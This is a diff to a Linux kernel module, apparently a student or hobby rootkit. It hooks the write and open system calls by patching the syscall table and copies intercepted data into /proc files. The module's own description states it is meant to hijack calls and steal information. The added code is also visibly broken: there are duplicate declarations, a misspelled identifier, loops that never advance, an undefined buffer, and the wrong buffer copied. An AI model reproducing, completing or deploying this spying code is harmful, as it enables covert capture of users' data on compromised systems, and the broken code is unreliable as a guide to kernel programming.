@@ -34,42 +34,53 @@ static void *original_open = NULL;
 asmlinkage int (*old_write)(int fildes, const void *buf, size_t nbytes);
 asmlinkage int (*old_open)(const char *filename, int flags, int mode);
 
-char *buff;
-int buff_length;
-
 //Proc File variables
-const char procFile[] = "syscall_mal";
-char input[100]; // Gives
+const char proc_file_write[] = "proc_mal_write";
+const char proc_file_write[] = "proc_mal_open";
+char proc_buffer_write[1000];
+int proc_buffer_size_write = 0;
+char proc_buffer_open[1000];
+int proc_buffer_size_open = 0;
 
+static ssize_t proc_read_write(struct file *fp, char *buf, size_t len, loff_t * off)
+{
+  //Stops the user from asking for information for forever.
+  static int finished=0;
+  if(finished) {
+    finished = 0;
+    return 0;
+  }
+  finished = 1;
+		memcpy(buffer, proc_buffer_write, proc_buffer_size_write);
 
-static int proc_show(struct seq_file *m, void *v) {
-
-  seq_printf(m, input);
-  return 0;
+	return proc_buffer_size_write;
 }
 
+static ssize_t proc_read_open(struct file *fp, char *buf, size_t len, loff_t * off)
+{
+  //Stops the user from asking for information for forever.
+  static int finished=0;
+  if(finished) {
+    finished = 0;
+    return 0;
+  }
+  finished = 1;
+		memcpy(buffer, proc_buffer_write, proc_buffer_size_write);
 
-
-static int proc_open(struct inode *inode, struct  file *file) {
-
-  return single_open(file, proc_show, NULL);
+	return proc_buffer_size_open;
 }
 
-
-
-static const struct file_operations proc_input = {
-
-  .owner = THIS_MODULE,
-  .open = proc_open,
-  .read = seq_read,
-  .llseek = seq_lseek,
-  .release = single_release,
+static struct file_operations proc_fops_write = {
+  .owner= THIS_MODULE,
+  .read= proc_read_write
 };
 
-
+static struct file_operations proc_fops_open = {
+  .owner= THIS_MODULE,
+  .read= proc_read_open
+};
 
 static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
-
 {
 	void *buffer[nbytes];
  	int steal_dest = fildes;
@@ -78,8 +89,14 @@ static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
                 return -EFAULT;
         }
 
-        buffer[nbytes-1] = 0;
+        buffer[nbytes-1] = '\0';
+        proc_buffer_size_write = 0;
+        int i = 0;
+        while (buffer[i] != '\0' && i <1000){
+          proc_buffer_write[i] = buffer[i];
 
+        }
+        proc_buffer_size_write = i;
         return (*old_write)(fildes, buf, nbytes);
 }
 
@@ -96,8 +113,14 @@ static unsigned long new_open(const char *filename, int flags, int mode)
                 return -EFAULT;
         }
 
-        buffer[99] = 0;
+        buffer[99] = '\0';
+        proc_buffer_size_open = 0;
+        int i = 0;
+        while (buffer[i] != '\0' && i <1000){
+          proc_buffer_open[i] = buffer[i];
 
+        }
+        proc_buffer_size_open = i;
         return (*old_open)(filename, flags, mode);
 }
 
@@ -108,7 +131,6 @@ static int is_syscall_table(ulong *p)
         return ((p != NULL) && (p[__NR_close] == (ulong)ksys_close));
 }
 
-
 static int page_read_write(ulong address)
 
 {
@@ -117,7 +139,7 @@ static int page_read_write(ulong address)
 
         if(pte->pte &~ _PAGE_RW)
                 pte->pte |= _PAGE_RW;
-	
+
         return 0;
 }
 
@@ -165,11 +187,12 @@ static void replace_syscall_open(ulong offset, ulong func_address)
 
 
 static int init_syscall(void)
-	
+
 {
-        proc_create(procFile, 0, NULL, proc);
+        proc_create(proc_file_write, 0, NULL, &proc_fops_write);
+        proc_create(proc_flle_open, 0, NULL, &proc_fops_open);
         replace_syscall_write(SYSCALL_NI, (ulong)new_write);
-	replace_syscall_open(SYSCALL_NA, (ulong)new_open);
+	      replace_syscall_open(SYSCALL_NA, (ulong)new_open);
         return 0;
 }
 
@@ -177,10 +200,11 @@ static int init_syscall(void)
 static void cleanup_syscall(void)
 
 {
-        remove_proc_entry(procFile,NULL);
+        remove_proc_entry(proc_file_write,NULL);
+        remove_proc_entry(proc_file_open,NULL);
         page_read_write((ulong)syscall_table);
         syscall_table[SYSCALL_NI] = (ulong)original_write;
-	syscall_table[SYSCALL_NA] = (ulong)original_open;
+	      syscall_table[SYSCALL_NA] = (ulong)original_open;
         page_read_only((ulong)syscall_table);
 
 }
@@ -190,4 +214,4 @@ module_init(init_syscall);
 module_exit(cleanup_syscall);
 
 MODULE_LICENSE("GPL v2");
-MODULE_DESCRIPTION("A kernel module to list process by their names");
+MODULE_DESCRIPTION("A kernel module hijack both close() and write() and steal the information");
